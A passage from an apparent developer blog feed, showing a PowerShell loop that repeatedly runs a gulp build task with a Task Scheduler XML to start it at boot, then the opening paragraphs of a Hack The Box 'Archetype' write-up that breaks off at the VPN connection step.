style="color:#e3116c">"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token variable" style="color:#36acaa">$sleepTimeInSeconds</span><span class="token plain"> = </span><span class="token variable" style="color:#36acaa">$waitTimeBetweenBuildsInMinutes</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> 60</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token function" style="color:#d73a49">Write-Host</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token function" style="color:#d73a49">Get-Date</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Format U</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">" Starting sleep timer: </span><span class="token string variable" style="color:#36acaa">$sleepTimeInSeconds</span><span class="token string" style="color:#e3116c"> seconds..."</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">(</span><span class="token function" style="color:#d73a49">Get-Date</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Format U</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">" Starting sleep timer: </span><span class="token string variable" style="color:#36acaa">$sleepTimeInSeconds</span><span class="token string" style="color:#e3116c"> seconds..."</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">|</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">Out-File</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">FilePath </span><span class="token variable" style="color:#36acaa">$logLocation</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Append</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token function" style="color:#d73a49">Start-Sleep</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Seconds </span><span class="token variable" style="color:#36acaa">$sleepTimeInSeconds</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token function" style="color:#d73a49">Write-Host</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token function" style="color:#d73a49">Get-Date</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Format U</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"Sleep ended"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">(</span><span class="token function" style="color:#d73a49">Get-Date</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Format U</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">" Sleep ended"</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">|</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">Out-File</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">FilePath </span><span class="token variable" style="color:#36acaa">$logLocation</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Append</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">while</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token boolean" style="color:#36acaa">$True</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>The script basically runs an infinite loop with a configurable timeout (line 6, variable <code>waitTimeBetweenBuildsInMinutes</code>) executing the <code>gulp</code> task. We can also configure the name of the task in line 9, variable <code>taskName</code>.
I needed to ensure that the PowerShell script would be initialized after a reboot so I wrote a Task Scheduler XML to automatically start the script upon server boot:</p>
<div class="language-markup codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-markup codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token prolog" style="color:#999988;font-style:italic">&lt;?xml version="1.0" encoding="UTF-16"?&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">Task</span><span class="token tag" style="color:#00009f"> </span><span class="token tag attr-name" style="color:#00a4db">version</span><span class="token tag attr-value punctuation attr-equals" style="color:#393A34">=</span><span class="token tag attr-value punctuation" style="color:#393A34">"</span><span class="token tag attr-value" style="color:#e3116c">1.2</span><span class="token tag attr-value punctuation" style="color:#393A34">"</span><span class="token tag" style="color:#00009f"> </span><span class="token tag attr-name" style="color:#00a4db">xmlns</span><span class="token tag attr-value punctuation attr-equals" style="color:#393A34">=</span><span class="token tag attr-value punctuation" style="color:#393A34">"</span><span class="token tag attr-value" style="color:#e3116c">http://schemas.microsoft.com/windows/2004/02/mit/task</span><span class="token tag attr-value punctuation" style="color:#393A34">"</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">RegistrationInfo</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">Date</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">2020-01-01T00:00:00.0000000</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">Date</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">Author</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">SOME_DOMAIN\YOUR_USER</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">Author</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">                    </span><span class="token comment" style="color:#999988;font-style:italic">&lt;!--Change author--&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">RegistrationInfo</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">Triggers</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">BootTrigger</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">ExecutionTimeLimit</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">PT12H</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">ExecutionTimeLimit</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">Enabled</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">true</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">Enabled</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">BootTrigger</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">Triggers</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">Principals</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">Principal</span><span class="token tag" style="color:#00009f"> </span><span class="token tag attr-name" style="color:#00a4db">id</span><span class="token tag attr-value punctuation attr-equals" style="color:#393A34">=</span><span class="token tag attr-value punctuation" style="color:#393A34">"</span><span class="token tag attr-value" style="color:#e3116c">Author</span><span class="token tag attr-value punctuation" style="color:#393A34">"</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">UserId</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">SOME_DOMAIN\YOUR_USER</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">UserId</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">                  </span><span class="token comment" style="color:#999988;font-style:italic">&lt;!--Change author--&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">LogonType</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">Password</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">LogonType</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">RunLevel</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">HighestAvailable</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">RunLevel</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">Principal</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">Principals</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">Settings</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">MultipleInstancesPolicy</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">IgnoreNew</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">MultipleInstancesPolicy</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">DisallowStartIfOnBatteries</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">true</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">DisallowStartIfOnBatteries</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">StopIfGoingOnBatteries</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">true</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">StopIfGoingOnBatteries</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">AllowHardTerminate</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">true</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">AllowHardTerminate</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">StartWhenAvailable</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">false</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">StartWhenAvailable</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">RunOnlyIfNetworkAvailable</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">false</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">RunOnlyIfNetworkAvailable</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">IdleSettings</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">StopOnIdleEnd</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">true</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">StopOnIdleEnd</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">RestartOnIdle</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">false</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">RestartOnIdle</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">IdleSettings</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">AllowStartOnDemand</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">true</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">AllowStartOnDemand</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">Enabled</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">true</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">Enabled</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">Hidden</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">false</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">Hidden</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">RunOnlyIfIdle</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">false</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">RunOnlyIfIdle</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">WakeToRun</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">false</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">WakeToRun</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">ExecutionTimeLimit</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">P1D</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">ExecutionTimeLimit</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">Priority</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">7</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">Priority</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">Settings</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">Actions</span><span class="token tag" style="color:#00009f"> </span><span class="token tag attr-name" style="color:#00a4db">Context</span><span class="token tag attr-value punctuation attr-equals" style="color:#393A34">=</span><span class="token tag attr-value punctuation" style="color:#393A34">"</span><span class="token tag attr-value" style="color:#e3116c">Author</span><span class="token tag attr-value punctuation" style="color:#393A34">"</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">Exec</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">Command</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">powershell.exe</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">Command</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">Arguments</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">-ExecutionPolicy Bypass "C:\path\to\gulpTaskSequentialWithWait.ps1"</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">Arguments</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">&lt;!--Change script location--&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">Exec</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">Actions</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">Task</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>The Task runs the following commands:</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">powershell</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">exe </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">ExecutionPolicy Bypass gulpTaskSequentialWithWait</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">ps1</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>And ensures that the Task is run on boot:</p>
<div class="language-markup codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-markup codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">Triggers</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">BootTrigger</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">ExecutionTimeLimit</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">PT12H</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">ExecutionTimeLimit</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">Enabled</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">true</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">Enabled</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">BootTrigger</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">Triggers</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Another happy customer!</p>]]></content>
        <author>
            <name>Kobbi Gal</name>
            <uri>https://github.com/kbbgl</uri>
        </author>
        <category label="Gulp" term="Gulp"/>
        <category label="Gulp.js" term="Gulp.js"/>
        <category label="Gulpjs" term="Gulpjs"/>
        <category label="Script" term="Script"/>
        <category label="Scripting" term="Scripting"/>
        <category label="Task_scheduler" term="Task_scheduler"/>
        <category label="Windows" term="Windows"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[Hack The Box ‘Archetype’ Challenge]]></title>
        <id>https://kbbgl.github.io/blog/hack-the-box-archetype-challenge</id>
        <link href="https://kbbgl.github.io/blog/hack-the-box-archetype-challenge"/>
        <updated>2025-02-26T00:45:50.000Z</updated>
        <summary type="html"><![CDATA[Fill me up!]]></summary>
        <content type="html"><![CDATA[<h2 class="anchor anchorWithStickyNavbar_LWe7" id="what-is-hack-the-box">What is Hack The Box?<a href="https://kbbgl.github.io/blog/hack-the-box-archetype-challenge#what-is-hack-the-box" class="hash-link" aria-label="Direct link to What is Hack The Box?" title="Direct link to What is Hack The Box?">​</a></h2>
<p><a href="https://www.hackthebox.eu/" target="_blank" rel="noopener noreferrer">Hack The Box</a> is a website offering vulnerable machines for practising hacking skills. The goal of the ‘Labs’ are to hack into the system and capture the flag (CTF) which can be found in a text file in the desktop of a regular and an administrator user.
On my pursuit to get some practical exercise in the field, I decided to sign up and attempt one of the beginner exercises. This post describes how I managed to get remote code execution (RCE) in the one of the boxes and access the flags.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="connecting-to-hack-the-box-network">Connecting to Hack The Box Network<a href="https://kbbgl.github.io/blog/hack-the-box-archetype-challenge#connecting-to-hack-the-box-network" class="hash-link" aria-label="Direct link to Connecting to Hack The Box Network" title="Direct link to Connecting to Hack The Box Network">​</a></h2>
<p>The first step is to connect to the Hack The Box network to be able to enumerate the target machine. To do this, we need to download an OpenVPN configuration file (<code>.ovpn</code>) and use the <code>openvpn</code> utility to create the tunnel into the Hack The Box network:</p>
